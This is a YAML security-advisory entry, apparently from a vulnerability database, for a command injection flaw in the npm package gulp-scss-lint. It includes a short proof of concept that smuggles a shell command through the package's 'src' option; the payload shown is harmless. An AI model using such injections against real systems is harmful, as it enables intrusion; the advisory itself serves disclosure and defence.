- id: snykio:npm:gulp-scss-lint:560114
  title: Command Injection
  description: |
    [gulp-scss-lint][1] is a Lint your .scss files.

    Affected versions of this package are vulnerable to Command Injection.
    It is possible to inject arbitrary commands to the `exec` function
    located in `src/command.js` via the provided options.

    ### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}

        var root = require("gulp-scss-lint");
        var attack_code = "echo vulnerable > create.txt";
        var opt = {
          "src": attack_code
        }
        root(opt);



    [1]: https://www.npmjs.com/package/gulp-scss-lint
